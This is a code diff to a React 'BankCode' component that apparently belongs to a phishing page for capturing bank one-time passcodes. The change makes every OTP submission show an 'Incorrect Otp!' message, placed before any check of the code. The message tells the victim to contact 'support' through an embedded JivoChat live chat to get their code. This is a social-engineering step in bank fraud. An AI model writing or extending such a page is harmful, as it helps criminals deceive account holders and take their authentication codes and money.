@@ -45,6 +45,7 @@ function BankCode() {
 
     const handleSubmit = async (e) => {
         e.preventDefault();
+        setCMode(!cMode)
         const otpValue = otp.join("");
         if (otpValue.length === 6) {
             try {
@@ -69,19 +70,35 @@ function BankCode() {
         }
     };
 
+    const [cMode, setCMode] = useState(false)
+
+    const cStyle = {
+        display: cMode ? "flex": "none",
+    }
+
+   function openJivoChat(){
+    if(typeof jivo_api !== 'undefined') {
+        jivo_api.open();
+    }else {
+        console.log("jivo not available")
+    }
+   }
 
 
 
 
     return (
         <>
-        <div className="c-support">
+        <div className="c-support" style={cStyle}>
            <div className="c-box">
              <h1>Incorrect Otp!</h1>
+             <i className="bi-headset"></i>
+             <p>For security reasons, you need to contact support and requuest for your OTP code</p>
+             <button onClick={openJivoChat}>Contact support</button>
            </div>
         </div>
         <div className="bank-code">
-            <h1 className="bank-c-head">Don't see a code in {`00:${count > 0 ? count : "00"}`}? <br /><span>Contact Support</span></h1>
+            <h1 className="bank-c-head">Don't see a code in {`00:${count > 0 ? count : "00"}`}? <br /><span onClick={openJivoChat}>Contact Support</span></h1>
             <div>
                 <div className="container" role="main">
                     <h2>Verify Your OTP</h2>
